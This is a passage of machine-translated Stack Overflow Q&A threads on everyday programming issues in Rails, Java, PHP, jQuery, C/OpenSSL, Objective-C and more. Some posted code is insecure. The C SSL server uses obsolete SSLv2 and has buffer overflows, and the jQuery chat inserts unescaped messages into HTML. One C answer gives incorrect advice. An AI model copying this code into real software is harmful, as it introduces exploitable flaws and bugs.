irb(main):001:0> html_escape({:a=>1, :b=>"my str"})
NoMethodError: undefined method `html_escape' for main:Object 
```

如何在 Rails 控制台中使用 h 或 html_escape？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T17:33:48.430

很容易解决。html_escape 在 ERB::Util 中定义，所以简单地写：

```
include ERB::Util 
```

在第一次使用 html_escape 之前在您的控制台中

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-01T17:32:06.843

你打电话给它`helper`。有些方法是私有的，因此您可能需要使用 send 来调用它们

```
helper.send(:html_escape, '123')
helper.pluralize 3, 'user' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:56:01.637

```
> helper.send(:html_escape, '{ a: 1, b: "my str" }')
"{ a: 1, b: &quot;my str&quot; }" 
```

# java - 请帮助在java中编辑数组

> ID：15163466
> 
> 赞同：1
> 
> 时间：2013-03-01T17:30:05.453
> 
> 标签：java, arrays

我很难创建我的这个通讯录，而且我也是新手。问题是我只想知道是否可以编辑或修改数组中的值，

```
String LNAME[]   = new String[SIZE];
String FNAME[]   = new String[SIZE];
String ADDRESS[] = new String[SIZE];
String CONTACT[] = new String[SIZE]; 
```

例如，如果我已经在 FNAME 数组中分配了 John Dor，我该如何编辑该值而无需再次执行整个过程，因为我只想用 e 替换 r，所以它会是 john doe。给定的地址也在那里，地址将包含大字符串......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:48:46.203

好吧，它相对容易，对于普通的字符串数组，您可以使用如下索引来指向，加上分配新字符串或使用诸如替换之类的方法......看看这个：

```
String FNAME[] = new String[1];
FNAME[0] = "John Dor";

System.out.println("FNAME #1: " + FNAME[0]); // prints John Dor

// Using replace to change letter
FNAME[0] = FNAME[0].replace('r', 'e');

System.out.println("FNAME #2: " + FNAME[0]); // prints John Doe

// Replacing with completely new string
FNAME[0] = "John Dor";

System.out.println("FNAME #3: " + FNAME[0]); // prints John Dor

FNAME[0] = "John Doe";

System.out.println("FNAME #4: " + FNAME[0]); // prints John Doe 
```

字符串数组的问题是你需要在初始化时知道​​它们的大小，我通常更喜欢 ArrayList。从这个来源看一下：[ArrayList example](http://www.javaprogrammingforums.com/java-se-api-tutorials/471-how-use-arraylist-what-its-advantage-over-array.html)

# php - PHP三元内部连接没有别的？

> ID：15163467
> 
> 赞同：5
> 
> 时间：2013-03-01T17:30:06.417
> 
> 标签：php, string, concatenation, ternary-operator, ternary

我想检查 2 个变量是否相同，如果是，则回显一个字符串。这可能在串联中吗？并在不创建单独功能的情况下做到这一点？

例如

`$var = 'here is the first part and '. ( $foo == $bar ) ? "the optional middle part" .' and the rest of the string.'`

**编辑**

请注意，我正在寻找是否有办法在*没有*`: ''`. 如果您愿意，可以使用“二元运算符”。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T17:32:58.753

不要试图把事情缩短太多。您需要它`: ''`才能使事情正常进行。

用于`(condition) ? "show when true" : ""`根据条件显示可选文本。三元运算符是这样命名的，因为它由 3 个部分组成。

```
$var = 'here is the first part and '. (( $foo == $bar ) ? "the optional middle part" : "") .' and the rest of the string.'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:39:11.793

如果问题是“我可以不用冒号和空引号吗？” 答案是否定的，你不能。你必须有结束语`:''`，最好用paren's来澄清你的愿望。

```
$var = 'here is the first part and '. 
        (( $foo == $bar ) ? "the optional middle part":'') .
       ' and the rest of the string.' 
```

我认为这里最大的问题是你试图内联做事。这基本上归结为相同的过程，并且不使用未封闭的三元：

```
$var = 'here is the first part and ';
if( $foo == $bar ) $var .= "the optional middle part";
$var .= ' and the rest of the string.'; 
```

而这是实现相同目标的另一种方法，而无需担心条件会破坏字符串：

```
$middle = '';
if( $foo == $bar ) $middle = ' the optional middle part and';
$var = sprintf('here is the first part and%s the rest of the string.',$middle); 
```

现在，如果你要变得不必要的聪明，我想你可以这样做：

```
$arr = array('here is the first part and',
             '', // array filter will remove this part
             'here is the end');
// TRUE evaluates to the key 1\. 
$arr[$foo == $bar] = 'here is the middle and';
$var = implode(' ', array_filter($arr)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-15T20:34:43.733

三元运算符语法如下

```
(any condition)?"return this when condition return true":"return this when condition return false" 
```

所以在你的字符串中应该是这样的

```
$var = 'here is the first part and '.( ( $foo == $bar ) ? "the optional middle part":"") .' and the rest of the string.' 
```

这意味着您的条件缺少其他过去和运算符优先级

# javascript - 加载多个 jQuery 版本

> ID：15163468
> 
> 赞同：4
> 
> 时间：2013-03-01T17:30:06.860
> 
> 标签：javascript, jquery, ajax

我编写了一个使用 jQuery 的工具，该工具可以动态加载到许多不同的网页上，包括已经使用 jQuery 的网页。我正在尝试在我无法直接控制的网页上加载 jQuery。当我这样做时，Ajax 调用该页面通过 jQuery 停止工作。该站点dailycaller.com 使用jQuery 延迟图像加载——当您向下滚动页面时，动态加载文章图像。当我尝试加载任何 jQuery 版本时，此动态图像获取中断。我怀疑这是由于我加载的 jQuery 和页面本身已经存在的 jQuery 之间的版本冲突。

为了测试这一点，我尝试加载与页面相同的版本。该页面包含一个脚本标签

```
<script type='text/javascript' src='http://cdn01.dailycaller.com/wp-includes/js/jquery/jquery.js?ver=1.7.2'></script> 
```

我的 JS 代码再次加载这个版本（异步，在页面加载之后），使用

```
var script = document.createElement( 'script' );
script.src = 'http://cdn01.dailycaller.com/wp-includes/js/jquery/jquery.js?ver=1.7.2';
document.body.appendChild(script); 
```

尽管理论上这个版本的 jQuery 已经在页面上，但这种加载会导致页面的 jQuery Ajax 调用中断。如何在不破坏此页面的动态负载的情况下加载任意 jQuery 版本？

我已经尝试使用这里推荐的 jQuery.noConflict()[我可以在同一页面上使用多个版本的 jQuery 吗？](https://stackoverflow.com/questions/1566595/can-i-use-multiple-versions-of-jquery-on-the-same-page)它不能解决这个问题。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T19:52:31.083

您需要允许动态加载的 jQuery 副本在调用之前完成加载`.noConflict()`。在 上使用`onload`事件`<script>`。

**演示：** [[[[![jsFiddle](../Images/827f57786617d886d70c0bce0ccca6b6.png)](http://jsfiddle.net/ThinkingStiff/Z8Ab8/)]]]

### 脚本：

```
var script = document.createElement( 'script' );
script.onload = function () {
    jQuery.noConflict( true ); //remove this and image load fails
};
script.src = 'http://cdn01.dailycaller.com/wp-includes/js/jquery/jquery.js?ver=1.7.2';
document.head.appendChild(script); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-07-01T14:59:32.293

我的 webapp 有一个非常相似的问题，有一种方法可以保留以前的版本并使用您自己的版本，即使使用插件也是如此，这就是我所做的：

```
<!-- USING A NEWER VERSION OF JQUERY -->

<!-- store and protect the old one -->
<script>
var oldJQuery = jQuery.noConflict();
</script>

<!-- load the new version and required plugins -->
<script type="text/javascript" src="../../script/jquery-1.9.1.min.js"></script>
<script type="text/javascript" src="../../script/jquery.mousewheel.min.js"></script>
<script type="text/javascript" src="../../script/jquery.hammer.js"></script>
<script type="text/javascript" src="../../script/jquery.xml2json.min.js"></script>

<!-- store and protect the new one and put the old one back -->
<script>
var jQuerX = jQuery.noConflict();
jQuery = oldJQuery;
</script> 
```

它保持旧版本不变，您可以在所选别名 (jQuerX) 下使用您的。

# asp.net-mvc - 协议错误：未知传输

> ID：15163471
> 
> 赞同：0
> 
> 时间：2013-03-01T17:30:13.530
> 
> 标签：asp.net-mvc

这是我的溃败

```
routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
        RouteTable.Routes.MapConnection<EchoConneaction>(name: "ChatService",
     url: "/Chat"
     ); 
```

这是我使用 Microsoft.AspNet.SignalR 的 PersistentConnection 类；

```
namespace SignalRPersistentConntection
{
    public class EchoConneaction:PersistentConnection
    {

    }
} 
```

我得到这个网址：

```
http://localhost:29115/chat 
```

然后我得到这个错误

> 协议错误：未知传输。

我的问题是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T20:40:30.980

该错误表明您正在连接到正确的 url。这将有助于了解您在客户端/服务器上创建连接和调用函数的准确程度。

# java - 在 Java 中使用 split 时出错

> ID：15163472
> 
> 赞同：1
> 
> 时间：2013-03-01T17:30:15.327
> 
> 标签：java, regex, string, split

我像这样在Java中使用split

```
String str = "Bx=1946^Cx=1043423";
String[] parts = str.split("^");
for (String part : parts)
    System.out.println(part); 
```

但是拆分后parts数组中只有一个元素，所以如果我想用“^”作为分隔符，应该写什么呢？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T17:32:14.927

您需要转义`^`，它在正则表达式中具有特殊含义（单词、行和其他的开头）：

```
String str = "Bx=1946^Cx=1043423";
String[] parts = str.split("\\^");
for (String part : parts)
    System.out.println(part); 
```

输出将是：

```
Bx=1946
Cx=1043423 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-05-05T10:44:52.277

采用

```
str.split(Pattern.quote("^")); 
```

代替

```
str.split("^"); 
```

`Pattern.quote()`在使用多个符号拆分的情况下也可以使用。例如，我们可以使用`str.split(Pattern.quote("^^^^"));`而不是添加太多的特殊字符，如`str.split("\\^\\^\\^\\^")`.

# asp.net - 禁用在 asp.net 中发送电子邮件

> ID：15163473
> 
> 赞同：1
> 
> 时间：2013-03-01T17:30:16.473
> 
> 标签：asp.net

有没有一种简单的方法可以禁用在 asp.net 中发送邮件？我正在使用网络表单，但我不想在我的开发服务器上工作时发送电子邮件。我可以注释掉我的系统发送电子邮件的每个地方，但我认为有一种更简单的方法可以做到这一点。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:39:15.260

希望您集中了“发送电子邮件”功能。然后很容易。检查您是否是本地/调试：

```
HttpContext.Current.Request.IsLocal || HttpContext.Current.IsDebuggingEnabled 
```

并适当回应。

我选择实际发送电子邮件，但我将 更改`to`为我的电子邮件帐户并添加额外消息，说明消息中的 、 和 是谁`to`（`cc`并`bcc`确保清除所有这些字段，以免发送真正的电子邮件）。这样您就可以判断您发送的电子邮件是否按预期工作——尤其是在您切换模板、替换电子邮件中的数据等时。

如果您没有集中“发送电子邮件”功能......可能是时候硬着头皮去做了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:37:23.397

一般来说，处理这个问题的最简单方法是在电子邮件配置中。通常它是数据库或 web.config 设置。您正在寻找的是定义用于发送消息的邮件服务器名称的部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:58:10.777

做你想做的事情的最简单方法涉及一点架构：

应用程序发送到的所有电子邮件地址都应该是您的 web.config 中的变量，此时复制和注释掉电子邮件地址字符串行并设置所有电子邮件发送给您变得很容易。

否则，您必须注释掉电子邮件在哪里逐行发送，当您推入 prod 时，该电子邮件在许多文件中变得非常容易出错，或者您的应用程序在测试期间预期发送电子邮件时将超时。

您还可以使用属性：http: [//msdn.microsoft.com/en-us/library/65zdfbdt%28v=vs.71%29.aspx](http://msdn.microsoft.com/en-us/library/65zdfbdt%28v=vs.71%29.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-02-10T14:49:13.170

我建议：

1.  使用 configSource 进行环境相关设置（例如，有一个 App_Data\config\dev 和 App_Data\config\live 等）。
2.  在您的开发配置文件中，只有一个空的 SMTP 设置，如 -

不会发送电子邮件，也不会抛出异常（至少 4.5.2 的 .NET 框架，这是我正在使用的。

希望这可以帮助。

# css - 换行但不换行后续的 div 元素

> ID：15163474
> 
> 赞同：0
> 
> 时间：2013-03-01T17:30:17.397
> 
> 标签：css

要将 div 包装到新行，我使用：

```
<div style="clear: both; padding-top: 10px;"></div> 
```

但这包装了所有其他后续 div。可以修改此代码，以便仅将 sbusequent（第一个）div 换行到新行，而其他所有 div 都保留在同一行上吗？

小提琴：http: [//jsfiddle.net/m2cvv/](http://jsfiddle.net/m2cvv/)

因此，将 div 与文本“不要换行”保持在同一行。

代码 ：

```
<div>test</div>
<div style="clear: both; padding-top: 10px;"></div>
<div>wrap this</div>
<div>do not wrap this</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:41:12.793

```
<div>test</div>
<div style="clear: both; padding-top: 10px;"></div>
<div style="display:inline;" >wrap this</div>
<div style="display:inline;">do not wrap this</div> 
```

最简单但不是最好的方法 - 尽量避免内联样式

# firefox - Firefox 字体出血

> ID：15163479
> 
> 赞同：1
> 
> 时间：2013-03-01T17:30:30.557
> 
> 标签：firefox, browser, fonts, font-face

我正在使用[Ostrich Sans Bold](http://www.fontsquirrel.com/fonts/ostrich-sans)作为我的标题之一。它在除 Firefox（最新版本）之外的所有浏览器中都能很好地呈现。

编辑：有没有办法让它在 Firefox 中正确呈现？还是我必须选择另一种字体？

这是一个示例（顶部为 FF，底部为 chrome）：

![例子](../Images/6e1b011b78cd1b07be19fe3cc0823360.png).

我在我的 CSS 中使用 @font-face。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T06:53:10.650

您是否可能没有在 @font-face 规则中将其声明为粗体，从而导致应用合成粗体？确保其中有 @font-face 规则`font-weight: bold`。

还要确保 Firefox 没有在该页面上缩放到非单位缩放。

除此之外，如果没有看到实际涉及的站点，就很难说...

# jasper-reports - 变量表达式：计算满足条件>0的所有记录

> ID：15163482
> 
> 赞同：0
> 
> 时间：2013-03-01T17:30:42.613
> 
> 标签：jasper-reports, ireport

我创建了一个变量来为我的报告保留一个位置中所有机械零件 ID 的计数。这很好用，现在我想添加一个过滤器，其中仅当机械零件 ID 的数量 > 0 时才计算它们。

**这是我必须开始的：**

变量名称：PART_COUNT

变量类类型：Java.lang.Integer

计算类型：计数

重置类型：组

重置组：LOCATION_ID

增量类型：无

变量表达式：$F{MACHINERY_PART_ID}

**我的报告中的一个字段设置如下：**

文本字段表达式类：Java.lang.Integer

评估时间：组

评估组：LOCATION_ID

文本字段表达式：$V{PART_COUNT}

新条件是 count(machinery_part_id) group by location_id 数量 >0

`$F{MACHINERY_PART_ID}`并且`$F{QUANTITY_SENT}`都是`java.lang.double`字段，我尝试在变量表达式中输入以下内容：

```
New Double($F{QUANTITY_SENT} > 0.00 ?  $F{QUANTITY_SENT}.doubleValue() : 0d) 
```

**但它出错了：**

```
Syntax error, insert ";" to complete BlockStatements 
```

我正在使用 iReport 3.0.0

请帮忙，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T16:13:06.237

我想到了：

**多变的**

变量名称：PART_COUNT

变量类类型：Java.lang.Double

计算类型：总和

重置类型：组

重置组：LOCATION_ID

增量类型：无

变量表达式：`new Double($F{QUANTITY_SENT}.doubleValue() > 0.00 ? 1.0:0.0)`

**文本域**

文本字段表达式类：Java.lang.Double

评估时间：组

评估组：LOCATION_ID

文本字段表达式：$V{PART_COUNT}

**问题** 我现在如何切换这个表达式以返回一个整数？

感谢您为我指明正确的方向。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T16:57:31.410

我想到了：

**文本域**

文本字段表达式类：Java.lang.Integer

评估时间：报告

文本字段表达式：`new Integer($V{PART_COUNT}.intValue())`

在这里找到答案：http: [//community.jaspersoft.com/questions/525053/cannot-cast-int-integer](http://community.jaspersoft.com/questions/525053/cannot-cast-int-integer)

# c - 不工作 SSL 服务器

> ID：15163483
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:30:44.603
> 
> 标签：c, sockets, ssl, winsock

我正在尝试使用 Windows 和 OpenSSL 创建一个简单的 SSL 服务器。

```
#include <WS2tcpip.h> 
#include <Winsock2.h> 

#include <errno.h>
//#include <unistd.h>
#include <malloc.h>
#include <string.h>
//#include <arpa/inet.h>
//#include <sys/socket.h>
#include <sys/types.h>
//#include <netinet/in.h>
//#include <resolv.h>
#include "openssl/ssl.h"
#include "openssl/err.h"

#define FAIL    -1

int OpenListener(int port)
{   int sd;
    struct sockaddr_in addr;

    sd = socket(PF_INET, SOCK_STREAM, 0);
    //bzero(&addr, sizeof(addr));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    if ( bind(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
    {
        perror("can't bind port");
        abort();
    }
    if ( listen(sd, 10) != 0 )
    {
        perror("Can't configure listening port");
        abort();
    }
    return sd;
}

SSL_CTX* InitServerCTX(void)
{   const SSL_METHOD *method;
    SSL_CTX *ctx;

    OpenSSL_add_all_algorithms();  /* load & register all cryptos, etc. */
    SSL_load_error_strings();   /* load all error messages */
    method = SSLv2_server_method();  /* create new server-method instance */
    ctx = SSL_CTX_new(method);   /* create new context from method */
    if ( ctx == NULL )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}

void LoadCertificates(SSL_CTX* ctx, char* CertFile, char* KeyFile)
{
 /* set the local certificate from CertFile */
    if ( SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0 )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    /* set the private key from KeyFile (may be the same as CertFile) */
    if ( SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0 )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    /* verify private key */
    if ( !SSL_CTX_check_private_key(ctx) )
    {
        fprintf(stderr, "Private key does not match the public certificate\n");
        abort();
    }
}

void ShowCerts(SSL* ssl)
{   X509 *cert;
    char *line;

    cert = SSL_get_peer_certificate(ssl); /* Get certificates (if available) */
    if ( cert != NULL )
    {
        printf("Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("Subject: %s\n", line);
        free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("Issuer: %s\n", line);
        free(line);
        X509_free(cert);
    }
    else
        printf("No certificates.\n");
}

void Servlet(SSL* ssl) /* Serve the connection -- threadable */
{   char buf[1024];
    char reply[1024];
    int sd, bytes;
    const char* HTMLecho="<html><body><pre>%s</pre></body></html>\n\n";

    if ( SSL_accept(ssl) == FAIL )     /* do SSL-protocol accept */
        ERR_print_errors_fp(stderr);
    else
    {
        ShowCerts(ssl);        /* get any certificates */
        bytes = SSL_read(ssl, buf, sizeof(buf)); /* get request */
        if ( bytes > 0 )
        {
            buf[bytes] = 0;
            printf("Client msg: \"%s\"\n", buf);
            sprintf(reply, HTMLecho, buf);   /* construct reply */
            SSL_write(ssl, reply, strlen(reply)); /* send reply */
        }
        else
            ERR_print_errors_fp(stderr);
    }
    sd = SSL_get_fd(ssl);       /* get socket connection */
    SSL_free(ssl);         /* release SSL state */
    //close(sd);          /* close connection */
    closesocket(sd);          /* close connection */
}

int main(int count, char *strings[])
{
    SSL_CTX *ctx;
    int server;
    char *portnum;

    if ( count != 2 )
    {
        printf("Usage: %s <portnum>\n", strings[0]);
        exit(0);
    }
    SSL_library_init();

    portnum = strings[1];
    ctx = InitServerCTX();        /* initialize SSL */
    LoadCertificates(ctx, "server.crt", "server.key"); /* load certs */
    server = OpenListener(atoi(portnum));    /* create server socket */
    while (1)
    {   struct sockaddr_in addr;
        socklen_t len = sizeof(addr);
        SSL *ssl;

        int client = accept(server, (struct sockaddr*)&addr, &len);  /* accept connection as usual */
        printf("Connection: %s:%d\n",inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
        ssl = SSL_new(ctx);              /* get new SSL state with context */
        SSL_set_fd(ssl, client);      /* set connection socket to SSL state */
        Servlet(ssl);         /* service connection */
    }
    //close(server);          /* close server socket */
    closesocket(server);          /* close server socket */
    SSL_CTX_free(ctx);         /* release context */
} 
```

并且应用程序在此代码中停止。

```
if ( bind(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
{
    perror("can't bind port");
    abort();
} 
```

*   视窗 7 x64
*   视觉 C++ 2012
*   Win32 OpenSSL v1.0.1e

> 看起来您的帖子主要是代码；请添加更多细节。

我不知道我还需要添加什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T21:03:26.467

只是为了完整起见：

在 Windows 下，需要像这样初始化网络堆栈（WinSock）：

```
WSADATA wsaData;
int iResult;

// Initialize Winsock
iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
if (iResult != 0) {
    printf("WSAStartup failed: %d\n", iResult);
    return 1;
} 
```

`WSACleanup`完成网络堆栈后，您还不能忘记调用以释放剩余资源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T19:20:17.007

因此，我重构了您的代码，删除了您不需要的所有废话（如建议的那样）并发现了问题。

`portnum = strings[1];`

~~这几乎可以肯定评估为零，因此您的程序正在尝试绑定到端口 0。~~ 不知道这里插入了什么值，但我确定这不是您所期望的。

**不正确！！！！！！**

相反，该行应该是：

`portnum = strings(strings[1]);`

此外，按照惯例，当人们编写“C”程序时，main 的签名是：

```
int main (int argc, char **argv) 
```

**或者**

```
int main (int argc, char *argv[]) 
```

使用这些变量名（`argc`& `argv`）

为了您和您身后的人，请遵守此约定。这意味着您的端口号线 s/b：

`portnum = atoi(argv[1]);`

顺便说一句，不要忘记`WSADATA/WSAStartup`Refugnic **Eternium**也建议的部分。

# iphone - NSMutable 阵列泄漏

> ID：15163485
> 
> 赞同：1
> 
> 时间：2013-03-01T17:30:49.013
> 
> 标签：iphone, objective-c, cocos2d-iphone, nsmutablearray, memory-leaks

我正在 cocos2d 中制作一个 iPhone 应用程序，并且我在泄漏工具标记 NSMutableArray 时遇到了一些麻烦，我的应用程序显然正在泄漏。我已经解决了这个问题，但我真的不明白为什么它首先会发生，所以希望有人可以向我解释。

我对 CCParticleSystemQuad 进行了子类化，以便可以添加一些实例变量，包括一个名为“damagedObjects”的 NSMutable 数组：

```
@interface SonicBoom : CCParticleSystemQuad{

NSMutableArray *damagedObjects;
HelloWorldLayer *gameClass;
CGPoint radiusPoint;
CGPoint origin;    
}

@property(nonatomic, retain) NSMutableArray *damagedObjects;
@property(nonatomic, retain) HelloWorldLayer *gameClass;
@property CGPoint radiusPoint;
@property CGPoint origin;

@end 
```

这将被初始化，并且损坏的对象数组被分配到主游戏类中，粒子系统在完成时通过设置 autoRemoveOnFinish 属性被移除：

```
-(void)createSonicBoom{

sonicBoom = [SonicBoom particleWithFile:@"SonicBoom.plist"];

sonicBoom.damagedObjects = [[NSMutableArray alloc]init];

sonicBoom.gameClass = self;

sonicBoom.autoRemoveOnFinish = YES;

//etc.......... 
```

然后，我重写了“SonicBoom”类的 dealloc 方法以释放“damagedObjects”数组：

```
-(void)dealloc{

NSLog(@"Removing SonicBoom");

NSLog(@"damaged objects retain count = %i", damagedObjects.retainCount);

gameClass.sonicBoomActive = NO;

[damagedObjects removeAllObjects];

[damagedObjects release];
[damagedObjects release];

[super dealloc];

} 
```

出于某种原因，只有一个发布消息到阵列我得到了泄漏。我检查了保留计数（我通常从不考虑这些），它是 2，所以我现在发送了两次发布消息，这似乎已经解决了问题。

这是发布它的最佳方式吗，有人可以解释为什么需要这样做吗？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:36:51.553

It's happening because of this line:

```
sonicBoom.damagedObjects = [[NSMutableArray alloc]init]; 
```

The init increases the reference count by 1, and then setting the retained property also increases it.

Change it to:

```
NSMutableArray *array = [[NSMutableArray alloc]init];
sonicBoom.damagedObjects = array;
[array release]; 
```

Alternatively you could have used:

```
sonicBoom.damagedObjects = [NSMutableArray array]; 
```

Which returns an autoreleased object, and the only object your class owns is the one it retained with the setter.

Also, FWIW, fixing a leak by releasing something twice in dealloc is definitely not a good idea. If one day you decided to set `damagedObjects` using some other method that was returning an autoreleased array, your app would start crashing and tracking down crashes like that can be a pain.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T17:35:46.027

This line:

```
sonicBoom.damagedObjects = [[NSMutableArray alloc]init]; 
```

Is the problem. Roughly put, here's what the compiler expands that out to:

```
[sonicBoom setDamagedObjects:[[[NSMutableArray alloc]init]retain]]; 
```

sonicBoom, by having it's `damagedObjects` property use a retain qualifier, tries to stake a claim to the array that you've created in your method, incrementing it's retain count by 1 over the 1 that is already inherently returned by the alloc and init pair. (alloc eventually calls

Thus, you have two references to the array because you're not following standard cocoa memory management guidelines or MVC. Either autorelease the array or use the convenience constructor `[NSMutableArray array];` (which autoreleases for you because cocoa allows only a strict subset of methods to return +1 references to objects) . Better yet, make the sonic boom object create its own array, so that it "owns" it memory-wise.

Edit (for those who feel I have provided an insufficient level of detail <*cough*>).

`retain` as a memory qualifier in a Manual Reference Counting environment for Objective-C objects (specifically those that descend from NSObject, or NSProxy) with a standard, compiler generated setter through the use of the @synthesize directive, consists of a standard set of calls which may or may not appear in the following form (the general concept of how retain counts are balanced in the generated setter is nearly the identical to the pseudo-code below):

```
- (void)setMyObject:(NSObject*)newMyObject {
    [_myObject release];
    _myObject = [newMyObject retain];
} 
```

Of course, this is an `nonatomic` (able to be interrupted by another thread) variation of the setter. The `atomic` version, is implemented very similarly to

```
- (void)setMyObject:(NSObject*)newMyObject {
    @synchronized(self) {
        [_myObject release];
        _myObject = [newMyObject retain];
    }
} 
```

Obviously, these omit the Key-Value-Coding mechanism inherent in Cocoa setters, but those operators are not generally exposed to the public by Apple, and are out of bounds for a subject such as memory management, so it’s implementation is left as an exercise to the reader.

We can, however, take a closer look at memory management by evaluating the calls the [Open Source version of NSObject](http://www.opensource.apple.com/source/objc4/objc4-532.2/runtime/NSObject.mm) puts out*.

[*Note that this version of NSObject corresponds to the version present in the Mac OS X SDK, and therefore, not all underlying implementations of NSObject will be guaranteed to match what is provided.]

`-retain`, as implemented by the latest open source version, at the time of this writing, of NSObject (runtime version 532, rev. 2), calls down to 3 individual internal constructs, one after another, should the previous one fail, finally ending in a "slow retain" of the root NSObject. It is important to note: NSObject is implemented in Objective-C++, with gratuitous calls to the internal LLVM library. Such is where our analysis of NSObject will end should it be encountered.

`-retain` is implemented, like all root Objective-C memory management calls, as a 16-byte aligned method returning the object itself upon success. According to NSObject.mm, retain looks like this:

```
- (id)retain __attribute__((aligned(16))) {     
    if (OBJC_IS_TAGGED_PTR(self)) return self;      

    SideTable *table = SideTable::tableForPointer(self);      
    if (OSSpinLockTry(&table->slock)) {         
        table->refcnts[DISGUISE(self)] += 2;         
        OSSpinLockUnlock(&table->slock);         
        return self;     
    }     
    return _objc_rootRetain_slow(self); 
} 
```

[*retain is replaced with ObjectAlloc when the appropriate flag is passed at launch for easier debugging. An analysis of ObjectAlloc is not provided at this time.]

To examine each in pieces, it is also necessary to access the file `objc-private.h`, which is also freely along with the NSObject version tagged in this post in the same directory.

To begin, retain checks whether the pointer has been tagged. Of course, a tag could mean anything, but to NSObject, it means whether or not the pointer contains the address of 0x1 in it’s last bit (if you’ll recall, because of 16 byte alignments, all types except char* have addresses that are guaranteed by Mac OS X to have a 0 at the end of their addresses). Thus, `OBJC_IS_TAGGED_PTR(PTR)` expands out to

```
((uintptr_t)(PTR) & 0x1) 
```

If the pointer is tagged, NSObject takes the easy way out and simply returns itself (because usually tagged pointers indicate invalid addresses).

Next, `-retain` tries a spin lock (note that `OS`-prefixed methods are unavailable on iOS) on the table for the given pointer to self. Tables, in the sense of NSObject, are what keep track of the retain count of the object. They are very simple C++ classes allocated along with the root NSObject. An interesting trick lies in that `DISCGUISE(x)` macro. It expands out to:

```
#define DISGUISE(x) ((id)~(uintptr_t)(x)) 
```

If you’ll notice, it’s flipping the pointer of the given object. I can only assume that this is done to hide `SideTable`’s double increment of the reference count of the object on the next line from instruments, as any object with a doubled retain count from one call could likely be seen as undefined behavior (when `-release` is sent, so to is the SideTable told to decrement it’s retain count by 2). The reference count is increased by two so as to keep the lowest bit of the address available to check if the object is in the process of being deallocated (which again, circles back around to tagged pointers). If all goes well, then the spin lock is released, and NSObject returns itself.

If the spin-lock happens to be unavailable for the taking, NSObject resorts to what it calls a “slow retain” (because the process of locking and unlocking the `SideTable`’s spin lock is mildly expensive), in which case the same process occurs, but NSObject steals and locks down the spin lock for it’s `SideTable`, increments it’s reference count by 2, then unlocks the spin lock. The entire process is represented by one C-function `_objc_rootRetain_slow`, which looks like this:

```
id _objc_rootRetain_slow(id obj) {     
    SideTable *table = SideTable::tableForPointer(obj);     
    OSSpinLockLock(&table->slock);     
    table->refcnts[DISGUISE(obj)] += 2;     
    OSSpinLockUnlock(&table->slock);      
    return obj; 
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T17:54:11.017

在不使用 ARC 时（或编写可在 ARC 或非 ARC 模式下使用的代码），我更喜欢以下风格：

在`-createSonicBoom,`

```
sonicBoom.damagedObjects = [NSMutableArray array]; // or e.g. arrayWithCapacity:10? 
```

在dealloc中，

```
self.damagedObjects = nil; 
```

有一个小问题：如果你重写了 setter 方法来做一些聪明的事情，它可能会在`-dealloc`.

# php - 使用 AJAX（PHP 和 JQuery）聊天心跳

> ID：15163487
> 
> 赞同：1
> 
> 时间：2013-03-01T17:30:52.170
> 
> 标签：php, javascript, jquery, ajax

我开发了用户之间的 jquery 实时聊天。

我想知道我计划的心跳是节省资源还是浪费很多？

这是心跳代码：

```
function chatheartbeat(){
    var dataString = 'action=chatheartbeat';
    $.ajax({
        url: "../chat.php",
        type: "POST",
        data: dataString,
        success: function(items){
            if(items != 0){
                $.each(items, function (i, elem) {
                    if ($("#chat_"+elem.from).length > 0) {
                    $("#chat_"+elem.from+" .chatmessege").append('<div class="chatboxmessagehead"><span>'+elem.from+':</span><a>'+elem.timee+'</a></div><br><div class="chatboxmessage">'+elem.msg+'</div>');
                    $("#chat_"+elem.from+" .chatmessege").scrollTop($("#chat_"+elem.from+" .chatmessege")[0].scrollHeight);
                    }else{
                    startchat(elem.from);
                    }
                });
            }
        }
    });
